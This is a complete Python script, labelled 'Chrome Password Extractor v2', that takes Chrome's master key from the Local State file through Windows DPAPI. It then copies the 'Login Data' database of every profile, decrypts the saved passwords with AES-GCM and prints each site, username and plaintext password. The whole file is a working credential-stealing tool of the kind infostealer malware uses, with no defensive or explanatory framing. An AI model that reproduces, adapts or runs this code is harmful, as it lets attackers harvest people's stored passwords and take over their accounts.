import os
import sys
import json
import sqlite3
import ctypes
import ctypes.wintypes
import base64
import shutil
from pathlib import Path

# Windows DPAPI structures
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char))
    ]

def dpapi_unprotect(encrypted_data):
    """Decrypt data using Windows DPAPI"""
    blob_in = DATA_BLOB()
    blob_out = DATA_BLOB()
    
    buf = ctypes.create_string_buffer(encrypted_data)
    blob_in.cbData = len(encrypted_data)
    blob_in.pbData = ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))
    
    result = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(blob_out)
    )
    
    if not result:
        err = ctypes.GetLastError()
        raise Exception(f"CryptUnprotectData failed: error {err}")
    
    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    
    return decrypted

def get_master_key():
    """Get and decrypt Chrome's master encryption key"""
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Google', 'Chrome', 'User Data', 'Local State'
    )
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    
    decrypted_key = dpapi_unprotect(encrypted_key)
    return decrypted_key

def decrypt_password(encrypted_password, master_key):
    """Decrypt a Chrome password using AES-256-GCM"""
    try:
        if encrypted_password[:3] in (b'v10', b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(master_key)
            decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
            return decrypted.decode('utf-8')
        else:
            return dpapi_unprotect(encrypted_password).decode('utf-8', errors='replace')
    except Exception as e:
        return f"[Decryption failed: {str(e)}]"

def main():
    print("=== Chrome Password Extractor v2 ===\n")
    
    try:
        master_key = get_master_key()
        print(f"[+] Master key: {len(master_key)} bytes\n")
    except Exception as e:
        print(f"[-] Failed to get master key: {e}")
        return
    
    # Check all profiles
    user_data_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    profiles = ['Default'] + [d for d in os.listdir(user_data_path) if d.startswith('Profile')]
    
    all_sites = {}
    
    for profile in profiles:
        db_path = os.path.join(user_data_path, profile, 'Login Data')
        if not os.path.exists(db_path):
            continue
        
        temp_db = os.path.join(os.environ['TEMP'], f'chrome_login_{profile}.db')
        shutil.copy2(db_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created 
                FROM logins 
                WHERE username_value != '' 
                ORDER BY date_created DESC
            """)
            
            rows = cursor.fetchall()
            if rows:
                print(f"[+] Profile '{profile}': {len(rows)} credentials")
                
                for url, username, encrypted_password, date_created in rows:
                    try:
                        password = decrypt_password(encrypted_password, master_key)
                    except Exception as e:
                        password = f"[Error: {e}]"
                    
                    domain = url.split('/')[2] if '://' in url else url
                    if domain not in all_sites:
                        all_sites[domain] = []
                    all_sites[domain].append({
                        'url': url,
                        'username': username,
                        'password': password,
                        'profile': profile
                    })
            
            conn.close()
        except Exception as e:
            print(f"[-] Error reading {profile}: {e}")
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
    
    print(f"\n{'='*80}")
    print(f"Total sites with saved passwords: {len(all_sites)}")
    print(f"{'='*80}\n")
    
    for domain, creds in sorted(all_sites.items()):
        print(f"[{domain}]")
        for cred in creds:
            print(f"  URL: {cred['url']}")
            print(f"  Username: {cred['username']}")
            print(f"  Password: {cred['password']}")
            print(f"  Profile: {cred['profile']}")
            print()

if __name__ == '__main__':
    main()
